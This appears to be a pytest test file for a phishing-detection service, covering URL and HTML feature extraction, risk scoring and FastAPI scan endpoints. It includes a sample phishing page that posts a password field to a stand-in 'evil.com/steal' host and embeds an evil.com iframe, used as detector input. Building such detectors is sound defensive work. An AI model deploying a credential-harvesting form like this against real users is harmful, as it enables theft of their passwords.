"""Tests for URL and HTML feature extraction, and the FastAPI endpoints."""
import sys
import os

# Ensure backend package is importable
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

import pytest
from app.core.url_analyzer import (
    calculate_entropy,
    is_ip_address,
    extract_url_features,
    url_features_to_ml_vector,
)
from app.core.html_analyzer import extract_html_features, html_features_to_ml_vector
from app.core.scorer import compute_risk_score, get_risk_level, build_explanations


# ---------------------------------------------------------------------------
# URL Analyzer
# ---------------------------------------------------------------------------


class TestCalculateEntropy:
    def test_empty_string(self):
        assert calculate_entropy("") == 0.0

    def test_uniform_string(self):
        assert calculate_entropy("aaaa") == pytest.approx(0.0)

    def test_binary_string(self):
        assert calculate_entropy("aabb") == pytest.approx(1.0)

    def test_positive_entropy(self):
        assert calculate_entropy("abc") > 0.0


class TestIsIpAddress:
    def test_valid_ipv4(self):
        assert is_ip_address("192.168.1.1") is True

    def test_valid_ipv6(self):
        assert is_ip_address("::1") is True

    def test_domain(self):
        assert is_ip_address("google.com") is False

    def test_empty(self):
        assert is_ip_address("") is False


class TestExtractURLFeatures:
    def test_phishing_url(self):
        url = "http://192.168.1.1/login@paypal.com/secure/account"
        feats = extract_url_features(url, fetch_domain_age=False)
        assert feats["has_ip_address"] is True
        assert feats["has_at_symbol"] is True
        assert feats["has_https"] is False

    def test_legitimate_url(self):
        url = "https://www.google.com/search?q=test"
        feats = extract_url_features(url, fetch_domain_age=False)
        assert feats["has_https"] is True
        assert feats["has_ip_address"] is False
        assert feats["has_at_symbol"] is False
        assert feats["subdomain_count"] == 0

    def test_shortener_detected(self):
        url = "http://bit.ly/abc123"
        feats = extract_url_features(url, fetch_domain_age=False)
        assert feats["uses_shortener"] is True

    def test_suspicious_tld(self):
        url = "http://free-money.tk/claim"
        feats = extract_url_features(url, fetch_domain_age=False)
        assert feats["has_suspicious_tld"] is True

    def test_vector_length(self):
        url = "https://example.com/"
        feats = extract_url_features(url, fetch_domain_age=False)
        vec = url_features_to_ml_vector(feats)
        assert len(vec) == 15


# ---------------------------------------------------------------------------
# HTML Analyzer
# ---------------------------------------------------------------------------


PHISHING_HTML = """
<html>
<head><title>PayPal Login</title></head>
<body>
  <form action="http://evil.com/steal">
    <input type="password" name="pwd" />
  </form>
  <iframe src="http://evil.com/frame"></iframe>
</body>
</html>
"""

LEGIT_HTML = """
<html>
<head><title>Google</title>
<link rel="icon" href="/favicon.ico" />
</head>
<body><a href="https://www.google.com/about">About</a></body>
</html>
"""


class TestExtractHTMLFeatures:
    def test_phishing_html(self):
        feats = extract_html_features("http://notpaypal.com/login", PHISHING_HTML)
        assert feats["has_password_field"] is True
        assert feats["external_form_actions"] >= 1
        assert feats["iframe_count"] >= 1
        assert feats["title_brand_mismatch"] is True

    def test_legit_html(self):
        feats = extract_html_features("https://www.google.com/", LEGIT_HTML)
        assert feats["has_password_field"] is False
        assert feats["iframe_count"] == 0
        assert feats["has_favicon"] is True

    def test_vector_length(self):
        feats = extract_html_features("https://example.com/", LEGIT_HTML)
        vec = html_features_to_ml_vector(feats)
        assert len(vec) == 10


# ---------------------------------------------------------------------------
# Scorer
# ---------------------------------------------------------------------------


class TestScorer:
    def test_risk_score_bounds(self):
        assert compute_risk_score(0.0) == 0
        assert compute_risk_score(1.0) == 100
        assert compute_risk_score(0.5) == 50

    def test_risk_levels(self):
        assert get_risk_level(0) == "safe"
        assert get_risk_level(29) == "safe"
        assert get_risk_level(30) == "suspicious"
        assert get_risk_level(64) == "suspicious"
        assert get_risk_level(65) == "phishing"
        assert get_risk_level(100) == "phishing"

    def test_explanations_for_phishing_url(self):
        # Use a URL where the hostname IS an IP address
        url_feats = extract_url_features("http://192.168.1.1/x", fetch_domain_age=False)
        explanations = build_explanations(url_feats, None)
        factors = [e.factor for e in explanations]
        assert any("IP" in f for f in factors)

    def test_explanations_sorted_by_severity(self):
        url_feats = extract_url_features("http://192.168.1.1/x.tk", fetch_domain_age=False)
        explanations = build_explanations(url_feats, None)
        severity_order = {"high": 0, "medium": 1, "low": 2}
        severities = [severity_order[e.severity] for e in explanations]
        assert severities == sorted(severities)


# ---------------------------------------------------------------------------
# FastAPI endpoints (sync test client)
# ---------------------------------------------------------------------------


def test_health_endpoint():
    from fastapi.testclient import TestClient
    from app.main import app

    client = TestClient(app)
    resp = client.get("/health")
    assert resp.status_code == 200
    assert resp.json()["status"] == "healthy"


def test_scan_url_endpoint():
    from fastapi.testclient import TestClient
    from app.main import app

    client = TestClient(app)
    resp = client.post(
        "/api/v1/scan-url",
        json={"url": "http://192.168.1.1/login", "fetch_html": False},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert "risk_score" in data
    assert 0 <= data["risk_score"] <= 100
    assert data["risk_level"] in ("safe", "suspicious", "phishing")


def test_scan_html_endpoint():
    from fastapi.testclient import TestClient
    from app.main import app

    client = TestClient(app)
    resp = client.post(
        "/api/v1/scan-html",
        json={"url": "http://notpaypal.com/login", "html": PHISHING_HTML},
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["risk_score"] > 0


def test_batch_scan_endpoint():
    from fastapi.testclient import TestClient
    from app.main import app

    client = TestClient(app)
    resp = client.post(
        "/api/v1/batch-scan",
        json={
            "urls": ["https://google.com", "http://bit.ly/phish"],
            "fetch_html": False,
        },
    )
    assert resp.status_code == 200
    data = resp.json()
    assert data["total_scanned"] == 2
    assert len(data["results"]) == 2
